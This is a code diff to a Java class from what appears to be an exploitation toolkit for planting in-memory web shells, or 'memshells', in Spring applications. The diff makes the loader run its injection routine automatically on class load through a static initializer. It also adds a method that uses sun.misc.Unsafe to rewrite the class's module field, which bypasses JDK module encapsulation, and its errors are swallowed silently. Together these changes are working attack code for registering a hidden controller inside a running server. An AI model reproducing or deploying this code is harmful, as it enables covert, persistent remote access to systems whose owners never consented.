@@ -4,12 +4,14 @@ import com.ppp.annotation.JavaClassModifiable;
 import com.ppp.annotation.JavaClassType;
 import com.ppp.annotation.MemShell;
 import com.ppp.annotation.Middleware;
+import sun.misc.Unsafe;
 
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
+import java.util.Base64;
 import java.util.Map;
 import java.util.zip.GZIPInputStream;
 
@@ -25,7 +27,9 @@ public class SpringControllerContextLoader {
     private static String PATH;
     private static String NAME;
     private static String CLASSNAME;
-
+    static {
+        new SpringControllerContextLoader();
+    }
     public SpringControllerContextLoader() {
         try {
             inject();
@@ -35,6 +39,7 @@ public class SpringControllerContextLoader {
     }
 
     public static void inject() throws Exception {
+        addModule();
         Object requestAttributes = Class.forName("org.springframework.web.context.request.RequestContextHolder").getMethod("currentRequestAttributes").invoke(null);
         Object context = invokeMethod(requestAttributes.getClass(), requestAttributes, "getAttribute", new Class[]{String.class, Integer.TYPE}, new Object[]{"org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0});
 //         是否存在路由
@@ -129,5 +134,24 @@ public class SpringControllerContextLoader {
     public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
         final Field field = getField(obj.getClass(), fieldName);
         field.set(obj, value);
+    }
+
+    public static void addModule() {
+        try {
+            Class unsafeClass = Class.forName("sun.misc.Unsafe");
+            Field unsafeField = unsafeClass.getDeclaredField("theUnsafe");
+            unsafeField.setAccessible(true);
+            Unsafe unsafe = (Unsafe) unsafeField.get(null);
+            Method method = Class.class.getDeclaredMethod("getModule");
+            method.setAccessible(true);
+            Object module = method.invoke(Object.class);
+            Class cls = SpringControllerContextLoader.class;
+            long offset = unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));
+            Method getAndSetObjectMethod = unsafeClass.getMethod("getAndSetObject", Object.class, long.class, Object.class);
+            getAndSetObjectMethod.setAccessible(true);
+            getAndSetObjectMethod.invoke(unsafe, cls, offset, module);
+        } catch (Exception e) {
+
+        }
     }
 }
